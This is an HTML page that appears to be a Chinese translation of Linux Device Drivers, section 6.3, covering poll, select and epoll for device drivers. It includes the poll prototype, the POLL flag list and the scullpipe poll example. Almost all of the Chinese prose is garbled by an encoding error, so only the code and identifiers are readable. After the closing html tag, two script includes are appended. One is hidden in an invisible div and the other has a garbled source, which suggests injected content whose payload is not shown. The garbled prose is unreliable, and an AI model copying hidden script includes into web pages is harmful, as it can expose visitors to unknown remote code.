<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>6.3.&#160;poll  select-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch06.html" title="&#160;6&#160;&#160;߼ַ">
<link rel="prev" href="ch06s02.html" title="6.2.&#160; I/O">
<link rel="next" href="ch06s04.html" title="6.4.&#160;첽֪ͨ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">6.3.&#160;poll  select</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch06s02.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;6&#160;&#160;߼ַ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch06s04.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="pollandselect.sect1"></a>6.3.&#160;poll  select</h2></div></div></div>
<p>ʹ÷ I/O Ӧó򳣳ʹ poll, select,  epoll ϵͳ. poll, select  epoll ͬĹ: ÿһǷɶдһļ. ЩҲֱκһϵļд. , ǳڱʹöӦó, ճκһ. ͬĹܳɶṩ, Ϊ 2 ɲͬŶڼͬʱɵ: select  BSD Unix ,  poll  System V Ľ. epoll <sup>[<a name="id436502" href="#ftn.id436502">23</a>]</sup> 2.5.45, Ϊʹѯչǧļķ.</p>
<p>֧κһЩöҪ豸֧. ֧( 3 ) poll . еԭ:</p>
<pre class="programlisting">
unsigned int (*poll) (struct file *filp, poll_table *wait); 
</pre>
<p>, ۺʱûռһ poll, select,  epoll ϵͳ, 漰һصļ. 豸 2 :</p>
<div class="itemizedlist"><ul type="disc">
<li><p>1. һָʾѯ״̬仯ĵȴϵ poll_wait. ûļ I/O, ںʹڵȴϵȴеĴݸϵͳõļ. </p></li>
<li><p>2. һλ, ܲ̽еĲ.</p></li>
</ul></div>
<p> 2 ֱӵ, . , ֻṩϢ, , ÿʵ.</p>
<p>poll_table ṹ,  poll ĵ 2 , ںʵ poll, select,  epoll ;  &lt;linux/poll.h&gt;, ļ뱻Դ. д߲Ҫ֪ݲұΪһ͸Ķʹ; ݸԱÿܻѽ̵ĵȴ, ҿɸı poll ״̬. һȴе poll_table ṹͨú poll_wait:</p>
<pre class="programlisting">
 void poll_wait (struct file *, wait_queue_head_t *, poll_table *); 
</pre>
<p>poll ĵ 2 Ƿλ, ĸϱʵ; Ҳֱӵ. , 豸ݿ, һܲ˯߶; poll Ӧָʾʱ״̬. ־(ͨ &lt;linux/poll.h&gt; )ָʾܵĲ:</p>
<div class="variablelist"><dl>
<dt><span class="term">POLLIN <span></span></span></dt>
<dd><p>豸ɱض, λ.</p></dd>
<dt><span class="term">POLLRDNORM <span></span></span></dt>
<dd><p>λ, ""ݿ. һɶ豸(	POLLIN|POLLRDNORM ).</p></dd>
<dt><span class="term">POLLRDBAND <span></span></span></dt>
<dd><p>λָʾݿ豸жȡ. ǰֻ Linux ں˵һط( DECnet  )ͨ豸.</p></dd>
<dt><span class="term">POLLPRI <span></span></span></dt>
<dd><p>ȼ()ɲضȡ. λʹ select ļһ쳣, Ϊ selct Ϊһ쳣.</p></dd>
<dt><span class="term">POLLHUP<span></span></span></dt>
<dd><p>豸Ľ̼ļβ,  POLLUP(hang-up). һ select Ḻ֪̌豸ǿɶ, ͬ selcet 涨.</p></dd>
<dt><span class="term">POLLERR <span></span></span></dt>
<dd><p>һ豸Ϸ.  poll, 豸λɶд, Ϊдһ.</p></dd>
<dt><span class="term">POLLOUT <span></span></span></dt>
<dd><p>λڷֵ, 豸ɱд.</p></dd>
<dt><span class="term">POLLWRNORM<span></span></span></dt>
<dd><p>λ POLLOUT ͬĺ, ʱȷʵͬ. һд豸( POLLOUT|POLLWRNORM).</p></dd>
<dt><span class="term">POLLWRBAND<span></span></span></dt>
<dd><p>ͬ POLLRDBAND , λ˼Ǵȼݿд豸. ֻ poll ݱʵʹλ, Ϊһݱʹ.</p></dd>
</dl></div>
<p>Ӧظһ POLLRDBAND  POLLWRBAND Թ socket ļ: ͨ豸ʹЩ־.</p>
<p>poll ʹ˴ʵʹԼ򵥵Ķ.  poll  scullpipe ʵ:</p>
<pre class="programlisting">
static unsigned int scull_p_poll(struct file *filp, poll_table *wait)
{
        struct scull_pipe *dev = filp-&gt;private_data;
        unsigned int mask = 0;

        /*
        * The buffer is circular; it is considered full
        * if "wp" is right behind "rp" and empty if the
        * two are equal. 
        */
        down(&amp;dev-&gt;sem);
        poll_wait(filp, &amp;dev-&gt;inq,  wait);
        poll_wait(filp, &amp;dev-&gt;outq, wait);
        if (dev-&gt;rp != dev-&gt;wp)
                mask |= POLLIN | POLLRDNORM;  /* readable */
        if (spacefree(dev))
                mask |= POLLOUT | POLLWRNORM;  /* writable */
        up(&amp;dev-&gt;sem);
        return mask;
}
</pre>
<p>򵥵 2  scullpipe ȴе poll_table, ȷλ, ǷԶд.</p>
<p>ʾ poll ȱļβ֧, Ϊ scullpipe ֧ļβ. Դ󲿷ʵ豸, poll Ӧ POLLHUP ûи(߽). ʹ select ϵͳ, ļΪɶ. ʹ poll  select, Ӧó֪ܹ read Զȴ,  read  0 ָʾļβ.</p>
<p>,  FIFO, ߼һļβед߹رļ,  scullpipe жԶļβ. ͬΪ FIFO һ 2 ̵ͨѶͨ,  scullpipe һͰ, ˶ԷֻҪһ. , ʵںеĶû, ѡǵʵһͬ.</p>
<p> FIFO ͬķʽʵļβζż dev-&gt;nwwriters,  read  poll , ұļβ(ո)ûнʹ豸д. ҵ, ʹʵַ, һߴ scullpipe 豸д֮ǰ, ܼļβûлȴ. õķʽ open ʵ, ͬ FIFO ; ߵһϰ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="Interactionwithreadandwrite.sect2"></a>6.3.1.&#160; read  write Ľ</h3></div></div></div>
<p>poll  select õĿǰǷһ I/O . Ǹ, ǲ read  write. Ҫ, poll  select , ΪʹӦóͬʱȴ,  scull ûв.</p>
<p>һȷʵֶʹӦóȷǱҪ: еĹѾ˵, ڴܽ.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Readingdatafromthedevice.sect3"></a>6.3.1.1.&#160;豸ж</h4></div></div></div>
<div class="itemizedlist"><ul type="disc">
<li><p>뻺, read Ӧ̷, ûпע⵽ӳ, ӦóҪ, ȷݻܿ쵽. һֱС㱻, Ϊκɶ( scull ), ٷһֽ. , poll Ӧ POLLIN|POLLRDNORM.</p></li>
<li><p>뻺û, ȱʡ read ֱһֽ.  O_NONBLOCK λ, һ, read ̷ -EAGIN (һЩϰ汾 SYSTEM V  0 ʱ). Щ, poll 뱨豸ǲɶֱһֽڵ. һڻ, Ǿͻصǰ.</p></li>
<li><p>Ǵļβ, read Ӧ̷һ 0, Ƿ.  poll Ӧñ POLLHUP.</p></li>
</ul></div>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Writingtothedevice.sect3"></a>6.3.1.2.&#160;д豸</h4></div></div></div>
<div class="itemizedlist"><ul type="disc">
<li><p>пռ, write Ӧӳٷ. ɽС, ٽһֽ. ,  poll 豸ǿд, ͨ POLLOUT|POLLWRNORM.</p></li>
<li><p>, ȱʡ write ֱһЩռ䱻ͷ.  O_NOBLOCK , write ̷һ -EAGAIN(ʽ System V Unices  0). Щ, poll Ӧļǲд. һ, 豸ܽκζ, write  -ENOSPC("豸ûпռ"), Ƿ O_NONBLOCK.</p></li>
<li><p>ڷ֮ǰҪ wait , 㵱 O_NONBLOCK . ΪӦóѡҳһ write Ƿ. 豸д, ñ벻. ʹ豸ĳ뱣֤뵽еݱ, ṩһ fsync . , һƳ豸Ӧһ fsnyc .</p></li>
</ul></div>
<p>һͨõĹ, Ӧʶÿ豸ΨһĲʱЩ΢һ. , ¼豸(Ŵ豸)޷ִвд.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Flushingpendingoutput.sect3"></a>6.3.1.3.&#160;ˢ¹</h4></div></div></div>
<p>Ѿ write ԼܽȫҪ. fsync , ͬϵͳö, ȱ. ԭ:</p>
<pre class="programlisting">
 int (*fsync) (struct file *file, struct dentry *dentry, int datasync); 
</pre>
<p>һЩӦóҪȷݱ͵豸, fsync 뱻ʵΪ O_NONBLOCK Ƿ.  fsync ĵӦֻ豸ȫˢʱ(, Ϊ), ҪһЩʱ.  datasync  fsync  fdatasync ϵͳ; , ֻļϵͳ, Ժ.</p>
<p>fsync ûвѰ. òʱؼ, ÿ豸ɸߵĿζʵ. 󲿷ֵʱ, ַֻһ NULL ָǵ fops . 豸, һ, ʵʹͨõ block_fsync, Żˢ豸еĿ.</p>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheUnderlyingDataStructure.sect2"></a>6.3.2.&#160;ײݽṹ</h3></div></div></div>
<p>poll  select ϵͳõʵ൱ؼ, ЩȤι; epoll Ӹһ㵫ǽͬĻ. ۺʱûӦó poll, select,  epoll_ctl,<sup>[<a name="id437076" href="#ftn.id437076">24</a>]</sup> ں˵ϵͳõļ poll , ͬ poll_table ÿ. poll_table ṹֻǶһķװ, ʵʵݽṹ. Ǹݽṹ,  poll select, һڴҳ, а poll_table_entry ṹ. ÿ poll_table_entry бݸ poll_wait  struct file  wait_queue_head_t ָ, Լһĵȴ.  poll_wait ĵʱ̵ĵȴ. Ľṹںά̿ɱеĶȥ,  poll  select ֮ǰ.</p>
<p>ѯûһָʾ I/O ɲط, poll ü򵥵˯ֱһڵĵȴ().</p>
<p> poll ʵȤ poll ܱһ NULL ָΪ poll_table . ڼ.  poll Ӧóṩһ 0 ĳʱֵ(ָʾӦȴ), ûѻȴ, ϵͳ򵥵ز. poll_table ָ뻹Ϊ NULL καѯָʾ I/O ֮. Ϊںһ֪ᷢȴ, ȴ.</p>
<p> poll , poll_table ṹȥ, е֮ǰ뵽 poll ĵȴڱӱǵĵȴƳ.</p>
<p>ͼͼ<a href="ch06s03.html#ldd3-6-1.fig" title="ͼ&#160;6.1.&#160;poll ݽṹ">poll ݽṹ</a>չʾѯеݽṹ; ͼʵݽṹļ򻯵رʾ, Ϊһ poll ضҳʲҺÿ poll_table_entry ļָ.</p>
<div class="figure">
<a name="ldd3-6-1.fig"></a><p class="title"><b>ͼ&#160;6.1.&#160;poll ݽṹ</b></p>
<div><img src="images/snagitldd3/ldd3-6-1.png" alt="poll ݽṹ"></div>
</div>
<p>ڴ, µϵͳ epoll Ķ. һ͵, һ poll  select ĵֻһļ, ݽṹĿС. , Ӧó, ʹüǧļ. ʱ, ÿ I/O ֮úݽṹ÷ǳ. epoll ϵͳüӦóڲںݽṹֻһ, Ҷʹ.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id436502" href="#id436502">23</a>] </sup>ʵ, epoll һ 3 , òѯ. , ǵĿ, ǿΪһ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id437076" href="#id437076">24</a>] </sup>ǽڲݽṹΪ epoll_wait ĺ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch06s02.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch06.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch06s04.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">6.2.&#160; I/O&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;6.4.&#160;첽֪ͨ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>